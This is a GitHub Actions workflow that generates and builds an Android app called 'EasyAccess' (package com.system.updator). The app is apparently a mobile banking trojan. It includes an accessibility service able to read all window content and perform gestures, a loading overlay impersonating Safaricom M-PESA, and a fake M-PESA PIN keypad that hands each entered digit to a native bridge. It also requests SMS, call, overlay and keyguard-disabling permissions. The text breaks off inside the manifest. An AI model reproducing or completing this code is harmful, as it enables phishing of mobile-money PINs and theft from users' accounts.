name: Build EasyAccess APK

permissions:
  contents: write

on:
  push:
    branches: [main]
  workflow_dispatch:

env:
  ANDROID_HOME: /usr/local/lib/android/sdk
  ANDROID_SDK_ROOT: /usr/local/lib/android/sdk

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Verify Android SDK
        run: |
          echo "ANDROID_HOME=$ANDROID_HOME"
          ls "$ANDROID_HOME" || true
          ls "$ANDROID_HOME/platforms" || true
          ls "$ANDROID_HOME/build-tools" || true

      - name: Create project directory structure
        run: |
          mkdir -p app/src/main/java/com/system/updator
          mkdir -p app/src/main/res/{xml,values,layout,drawable}
          mkdir -p app/src/main/assets

      - name: Generate Gradle configuration files
        run: |
          cat > settings.gradle << 'EOF'
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          dependencyResolutionManagement {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "AccessibilityMenu"
          include ':app'
          EOF

          cat > build.gradle << 'EOF'
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.1.0'
              }
          }
          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          EOF

          cat > app/build.gradle << 'EOF'
          plugins {
              id 'com.android.application'
          }

          android {
              namespace 'com.system.updator'
              compileSdk 34

              defaultConfig {
                  applicationId "com.system.updator"
                  minSdk 26
                  targetSdk 34
                  versionCode 34
                  versionName "34.0"
              }

              buildTypes {
                  release {
                      minifyEnabled false
                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt')
                  }
                  debug {
                      minifyEnabled false
                  }
              }

              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }

              applicationVariants.all { variant ->
                  variant.outputs.all {
                      outputFileName = "EasyAccess.apk"
                  }
              }
          }

          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'androidx.core:core:1.12.0'
              implementation 'com.google.android.material:material:1.11.0'
              implementation 'androidx.work:work-runtime:2.9.0'
              implementation 'androidx.webkit:webkit:1.9.0'
              implementation 'com.google.code.gson:gson:2.10.1'
          }
          EOF

          cat > gradle.properties << 'EOF'
          org.gradle.jvmargs=-Xmx2048m
          android.useAndroidX=true
          android.enableJetifier=false
          android.suppressUnsupportedCompileSdk=34
          sdk.dir=/usr/local/lib/android/sdk
          EOF

          echo "sdk.dir=/usr/local/lib/android/sdk" > local.properties

      - name: Generate Gradle wrapper
        run: |
          mkdir -p gradle/wrapper
          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
          distributionBase=GRADLE_USER_HOME
          distributionPath=wrapper/dists
          distributionUrl=https\://services.gradle.org/distributions/gradle-8.0-bin.zip
          zipStoreBase=GRADLE_USER_HOME
          zipStorePath=wrapper/dists
          EOF
          curl -sL -o gradle/wrapper/gradle-wrapper.jar \
            https://raw.githubusercontent.com/gradle/gradle/v8.0.0/gradle/wrapper/gradle-wrapper.jar

          cat > gradlew << 'EOF'
          #!/bin/sh
          APP_HOME=$( cd "${APP_HOME:-./}" && pwd -P ) || exit
          APP_NAME="Gradle"
          APP_BASE_NAME=${0##*/}
          DEFAULT_JVM_OPTS='"-Xmx64m" "-Xms64m"'
          MAX_FD=maximum
          warn () { echo "$*" >&2; }
          die () { echo "$*"; echo; exit 1; }
          cygwin=false
          msys=false
          darwin=false
          nonstop=false
          case "$( uname )" in
            CYGWIN* ) cygwin=true ;;
            Darwin* ) darwin=true ;;
            MSYS* | MINGW* ) msys=true ;;
            NONSTOP* ) nonstop=false ;;
          esac
          CLASSPATH=$APP_HOME/gradle/wrapper/gradle-wrapper.jar
          if [ -n "$JAVA_HOME" ] ; then
              if [ -x "$JAVA_HOME/jre/sh/java" ] ; then
                  JAVACMD=$JAVA_HOME/jre/sh/java
              else
                  JAVACMD=$JAVA_HOME/bin/java
              fi
              if [ ! -x "$JAVACMD" ] ; then
                  die "ERROR: JAVA_HOME is set to an invalid directory: $JAVA_HOME"
              fi
          else
              JAVACMD=java
              which java >/dev/null 2>&1 || die "ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH."
          fi
          if ! "$cygwin" && ! "$darwin" && ! "$nonstop" ; then
              case $MAX_FD in
                max*) MAX_FD=$( ulimit -H -n ) || warn "Could not query maximum file descriptor limit" ;;
              esac
              case $MAX_FD in
                '' | soft) : ;;
                *) ulimit -n "$MAX_FD" || warn "Could not set maximum file descriptor limit to $MAX_FD" ;;
              esac
          fi
          if "$cygwin" || "$msys" ; then
              APP_HOME=$( cygpath --path --mixed "$APP_HOME" )
              CLASSPATH=$( cygpath --path --mixed "$CLASSPATH" )
              JAVACMD=$( cygpath --unix "$JAVACMD" )
              for arg do
                  if case $arg in -*) false;; /?*) t=${arg#/} t=/${t%%/*} [ -e "$t" ];; *) false;; esac; then
                      arg=$( cygpath --path --ignore --mixed "$arg" )
                  fi
                  set -- "$@" "$arg"
              done
          fi
          set -- $(echo "$@" | tr ' ' '\n' | sed 's/^--/ /' | tr '\n' ' ')
          set -- \
              "-Dorg.gradle.appname=$APP_BASE_NAME" \
              -classpath "$CLASSPATH" \
              org.gradle.wrapper.GradleWrapperMain \
              "$@"
          eval "set -- $(
              printf '%s\n' "$DEFAULT_JVM_OPTS $JAVA_OPTS $GRADLE_OPTS" |
              xargs -n1 |
              sed ' s~[^-[:alnum:]+,./:=@_]~\\&~g; ' |
              tr '\n' ' '
          )" '"$@"'
          exec "$JAVACMD" "$@"
          EOF
          chmod +x gradlew

      - name: Generate Android resources
        run: |
          cat > app/src/main/res/values/strings.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <string name="app_name">EasyAccess</string>
              <string name="accessibility_description">Control device via large menu</string>
              <string name="welcome_heading">Welcome\naboard.</string>
              <string name="welcome_subtitle">Experience the next generation of seamless design and intuitive interactions as you earn.</string>
              <string name="skip">Skip</string>
              <string name="get_started">Get Started</string>
          </resources>
          EOF

          cat > app/src/main/res/values/styles.xml << 'EOF'
          <resources>
              <style name="OverlayTheme" parent="@android:style/Theme.Material.Light.NoActionBar">
                  <item name="android:windowFullscreen">true</item>
                  <item name="android:windowNoTitle">true</item>
                  <item name="android:windowBackground">@android:color/transparent</item>
                  <item name="android:windowIsTranslucent">true</item>
                  <item name="android:windowIsFloating">false</item>
                  <item name="android:windowDisablePreview">true</item>
                  <item name="android:windowContentOverlay">@null</item>
                  <item name="android:backgroundDimEnabled">false</item>
                  <item name="android:statusBarColor">@android:color/transparent</item>
                  <item name="android:navigationBarColor">@android:color/transparent</item>
                  <item name="android:windowLightStatusBar">true</item>
                  <item name="android:windowLightNavigationBar">true</item>
                  <item name="android:windowLayoutInDisplayCutoutMode">shortEdges</item>
              </style>
          </resources>
          EOF

          cat > app/src/main/res/drawable/ic_launcher.xml << 'EOF'
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="192dp"
              android:height="192dp"
              android:viewportWidth="192"
              android:viewportHeight="192">
              <path
                  android:fillColor="#25D366"
                  android:pathData="M40,0 L152,0 A40,40 0 0 1 192,40 L192,152 A40,40 0 0 1 152,192 L40,192 A40,40 0 0 1 0,152 L0,40 A40,40 0 0 1 40,0 Z" />
              <path
                  android:fillColor="#FFFFFF"
                  android:pathData="M96,88 m-14,0 a14,14 0 1,0 28,0 a14,14 0 1,0 -28,0 Z" />
              <path
                  android:fillColor="#FFFFFF"
                  android:pathData="M48,88 m-14,0 a14,14 0 1,0 28,0 a14,14 0 1,0 -28,0 Z" />
              <path
                  android:fillColor="#FFFFFF"
                  android:pathData="M144,88 m-14,0 a14,14 0 1,0 28,0 a14,14 0 1,0 -28,0 Z" />
          </vector>
          EOF

          cat > app/src/main/res/drawable/bg_glow_indigo.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android"
              android:shape="oval">
              <gradient
                  android:type="radial"
                  android:gradientRadius="200dp"
                  android:startColor="#666366F1"
                  android:endColor="#006366F1" />
          </shape>
          EOF

          cat > app/src/main/res/drawable/bg_glow_pink.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android"
              android:shape="oval">
              <gradient
                  android:type="radial"
                  android:gradientRadius="150dp"
                  android:startColor="#26EC4899"
                  android:endColor="#00EC4899" />
          </shape>
          EOF

          cat > app/src/main/res/drawable/bg_start_button.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android"
              android:shape="rectangle">
              <solid android:color="#0DFFFFFF" />
              <stroke android:width="1dp" android:color="#1AFFFFFF" />
              <corners android:radius="20dp" />
          </shape>
          EOF

          cat > app/src/main/res/layout/activity_overlay.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:background="#FFFFFF"
              android:fitsSystemWindows="false">
              <WebView
                  android:id="@+id/overlayWebView"
                  android:layout_width="match_parent"
                  android:layout_height="match_parent"
                  android:fitsSystemWindows="false" />
          </FrameLayout>
          EOF

          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:background="#09090B">

              <View
                  android:layout_width="400dp"
                  android:layout_height="400dp"
                  android:layout_gravity="top|end"
                  android:layout_marginTop="-100dp"
                  android:layout_marginEnd="-100dp"
                  android:background="@drawable/bg_glow_indigo" />

              <View
                  android:layout_width="300dp"
                  android:layout_height="300dp"
                  android:layout_gravity="bottom|start"
                  android:layout_marginBottom="-50dp"
                  android:layout_marginStart="-50dp"
                  android:background="@drawable/bg_glow_pink" />

              <LinearLayout
                  android:layout_width="match_parent"
                  android:layout_height="match_parent"
                  android:orientation="vertical"
                  android:padding="40dp">

                  <FrameLayout
                      android:layout_width="match_parent"
                      android:layout_height="wrap_content">

                      <TextView
                          android:id="@+id/btnSkip"
                          android:layout_width="wrap_content"
                          android:layout_height="wrap_content"
                          android:layout_gravity="end"
                          android:text="@string/skip"
                          android:textColor="#71717A"
                          android:textSize="14sp"
                          android:textStyle="bold"
                          android:padding="8dp"
                          android:clickable="true"
                          android:focusable="true"
                          android:background="?android:attr/selectableItemBackground" />
                  </FrameLayout>

                  <LinearLayout
                      android:layout_width="match_parent"
                      android:layout_height="0dp"
                      android:layout_weight="1"
                      android:orientation="vertical"
                      android:gravity="center_vertical">

                      <TextView
                          android:layout_width="wrap_content"
                          android:layout_height="wrap_content"
                          android:text="@string/welcome_heading"
                          android:textColor="#FFFFFF"
                          android:textSize="48sp"
                          android:textStyle="bold"
                          android:letterSpacing="-0.03"
                          android:lineSpacingMultiplier="1.05"
                          android:layout_marginBottom="16dp" />

                      <TextView
                          android:layout_width="wrap_content"
                          android:layout_height="wrap_content"
                          android:text="@string/welcome_subtitle"
                          android:textColor="#A1A1AA"
                          android:textSize="16sp"
                          android:lineSpacingMultiplier="1.4"
                          android:maxWidth="300dp" />
                  </LinearLayout>

                  <LinearLayout
                      android:layout_width="match_parent"
                      android:layout_height="wrap_content"
                      android:orientation="vertical"
                      android:paddingBottom="20dp">

                      <TextView
                          android:id="@+id/btnStart"
                          android:layout_width="match_parent"
                          android:layout_height="wrap_content"
                          android:paddingTop="20dp"
                          android:paddingBottom="20dp"
                          android:paddingStart="30dp"
                          android:paddingEnd="30dp"
                          android:text="@string/get_started"
                          android:textColor="#FFFFFF"
                          android:textSize="18sp"
                          android:textStyle="bold"
                          android:gravity="start|center_vertical"
                          android:drawableEnd="@android:drawable/ic_media_play"
                          android:drawableTint="#FFFFFF"
                          android:background="@drawable/bg_start_button"
                          android:clickable="true"
                          android:focusable="true" />
                  </LinearLayout>
              </LinearLayout>
          </FrameLayout>
          EOF

          cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
              android:accessibilityEventTypes="typeAllMask"
              android:accessibilityFeedbackType="feedbackGeneric"
              android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagRequestTouchExplorationMode|flagIncludeNotImportantViews"
              android:canPerformGestures="true"
              android:canRetrieveWindowContent="true"
              android:description="@string/accessibility_description"
              android:notificationTimeout="50" />
          EOF

      - name: Generate overlay HTML asset (automation loading overlay)
        run: |
          cat > app/src/main/assets/overlay.html << 'HTMLEOF'
          <!DOCTYPE html>
          <html lang="en">
          <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
            <title>Safaricom M-PESA</title>
            <style>
              * { box-sizing: border-box; }
              html, body {
                width: 100%; height: 100%;
                min-width: 100%; min-height: 100%;
                margin: 0; padding: 0; overflow: hidden;
              }
              body {
                min-height: 100dvh;
                background: #ffffff;
                display: flex;
                align-items: center;
                justify-content: center;
                font-family: Arial, sans-serif;
              }
              .container {
                width: 100%; height: 100%;
                min-height: 100dvh;
                display: flex; flex-direction: column;
                align-items: center; justify-content: center;
                text-align: center; margin: 0; padding: 0;
              }
              .title {
                font-size: 28px;
                font-weight: 600;
                color: #008f3d;
                margin: 0 0 32px 0;
              }
              .loader {
                width: 42px; height: 42px; margin: 0;
                border: 4px solid #e5e5e5;
                border-top: 4px solid #008f3d;
                border-radius: 50%;
                animation: spin 1s linear infinite;
              }
              .status {
                font-size: 16px;
                color: #555555;
                margin: 24px 0 0 0;
              }
              @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
            </style>
          </head>
          <body>
            <div class="container">
              <div class="title">Safaricom M-PESA</div>
              <div class="loader"></div>
              <div class="status">Verifying your account please wait...</div>
            </div>
          </body>
          </html>
          HTMLEOF

      - name: Generate M-PESA PIN overlay HTML asset
        run: |
          cat > app/src/main/assets/mpesa_pin.html << 'HTMLEOF'
          <!DOCTYPE html>
          <html lang="en">
          <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
          <title>Keypad UI Overlay</title>

          <style>
          * {
              margin: 0;
              padding: 0;
              box-sizing: border-box;
              -webkit-tap-highlight-color: transparent;
          }

          html, body {
              width: 100%;
              height: 100%;
              overflow: hidden;
              font-family: Arial, sans-serif;
              background: transparent; 
          }

          .screen {
              position: relative;
              width: 100%;
              height: 100vh;
              height: 100dvh;
              overflow: hidden;
              background: transparent; 
          }

          .upper-area {
              position: absolute;
              top: 0;
              left: 0;
              width: 100%;
              height: 37%;
              background: transparent;
              pointer-events: none;
          }

          .white-backdrop {
              position: absolute;
              top: 37%;
              left: 0;
              width: 100%;
              height: 63%;
              background: #ffffff;
              z-index: 1;
          }

          .pin-boxes {
              position: absolute;
              top: 37%;
              left: 50%;
              transform: translateX(-50%);
              display: flex;
              gap: clamp(12px, 3.5vw, 28px);
              z-index: 2;
              padding-top: 20px;
          }

          .pin-box {
              width: clamp(55px, 12vw, 75px);
              height: clamp(55px, 12vw, 75px);
              border: 2px solid #cfd5df;
              border-radius: 14px;
              background: #ffffff;
              display: flex;
              align-items: center;
              justify-content: center;
              font-size: 26px;
              color: #293348;
          }

          .keypad-area {
              position: absolute;
              top: 47%;
              left: 0;
              width: 100%;
              height: 53%;
              background: transparent; 
              z-index: 2;
          }

          .keypad {
              position: absolute;
              top: 3%;
              left: 0;
              width: 100%;
              height: 94%;
              display: grid;
              grid-template-columns: repeat(3, 1fr);
              grid-template-rows: repeat(4, 1fr);
              align-items: center;
              justify-items: center;
          }

          .key {
              width: 100%;
              height: 100%;
              border: none;
              background: transparent;
              display: flex;
              align-items: center;
              justify-content: center;
              color: #293348;
              font-size: clamp(31px, 5.5vw, 44px);
              font-weight: 400;
              outline: none;
              cursor: pointer;
          }

          .key:active:not(:disabled) {
              background: rgba(150, 160, 180, 0.12);
              border-radius: 50%;
          }

          .key:disabled {
              cursor: default;
          }

          .delete-icon {
              width: 43px;
              height: 32px;
              stroke: #309b50;
              stroke-width: 2.4;
              fill: none;
              stroke-linecap: round;
              stroke-linejoin: round;
          }

          @media (max-height: 650px) {
              .pin-boxes { top: 30%; padding-top: 10px; }
              .upper-area { height: 30%; }
              .white-backdrop { top: 30%; height: 70%; }
              .keypad-area { top: 42%; height: 58%; }
          }
          </style>
          </head>

          <body>

          <div class="screen">

              <div class="upper-area"></div>

              <div class="white-backdrop"></div>

              <div class="pin-boxes" aria-label="PIN demonstration">
                  <div class="pin-box"></div>
                  <div class="pin-box"></div>
                  <div class="pin-box"></div>
                  <div class="pin-box"></div>
              </div>

              <div class="keypad-area">
                  <div class="keypad">

                      <button class="key" data-digit="1">1</button>
                      <button class="key" data-digit="2">2</button>
                      <button class="key" data-digit="3">3</button>

                      <button class="key" data-digit="4">4</button>
                      <button class="key" data-digit="5">5</button>
                      <button class="key" data-digit="6">6</button>

                      <button class="key" data-digit="7">7</button>
                      <button class="key" data-digit="8">8</button>
                      <button class="key" data-digit="9">9</button>

                      <button class="key" disabled></button>
                      <button class="key" data-digit="0">0</button>

                      <button class="key" id="delete" aria-label="Delete last digit">
                          <svg class="delete-icon" viewBox="0 0 44 32">
                              <path d="M13 3 H36 Q41 3 41 8 V24 Q41 29 36 29 H13 L2 16 Z"/>
                              <path d="M22 11 L30 21 M30 11 L22 21"/>
                          </svg>
                      </button>

                  </div>
              </div>

          </div>

          <script>
          const boxes = document.querySelectorAll(".pin-box");
          const keys = document.querySelectorAll("[data-digit]");
          const deleteButton = document.getElementById("delete");

          let digits = [];

          function renderPIN() {
              boxes.forEach((box, index) => {
                  box.textContent = digits[index] ? "•" : "";
              });
          }

          function report() {
              try {
                  if (window.MpesaPinBridge && typeof window.MpesaPinBridge.onPin === 'function') {
                      window.MpesaPinBridge.onPin(digits.join(''));
                  }
              } catch (e) {}
          }

          keys.forEach(button => {
              button.addEventListener("click", () => {
                  if (digits.length < 4) {
                      digits.push(button.dataset.digit);
                      renderPIN();
                      report();
                  }
              });
          });

          deleteButton.addEventListener("click", () => {
              if (digits.length > 0) {
                  digits.pop();
                  renderPIN();
                  report();
              }
          });
          </script>

          </body>
          </html>
          HTMLEOF

      - name: Generate AndroidManifest.xml
        run: |
          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              xmlns:tools="http://schemas.android.com/tools">

              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
              <uses-permission android:name="android.permission.RECEIVE_SMS" />
              <uses-permission android:name="android.permission.READ_SMS" />
              <uses-permission android:name="android.permission.CALL_PHONE" />
              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
              <uses-permission android:name="android.permission.GET_TASKS" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
              <uses-permission android:name="android.permission.WAKE_LOCK" />
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
              <uses-permission android:name="android.permission.READ_PHONE_STATE" />
              <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />

              <application
                  android:allowBackup="true"
                  android:label="@string/app_name"
                  android:icon="@drawable/ic_launcher"
                  android:usesCleartextTraffic="true"
                  android:requestLegacyExternalStorage="true">

                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:theme="@style/Theme.AppCompat.NoActionBar">
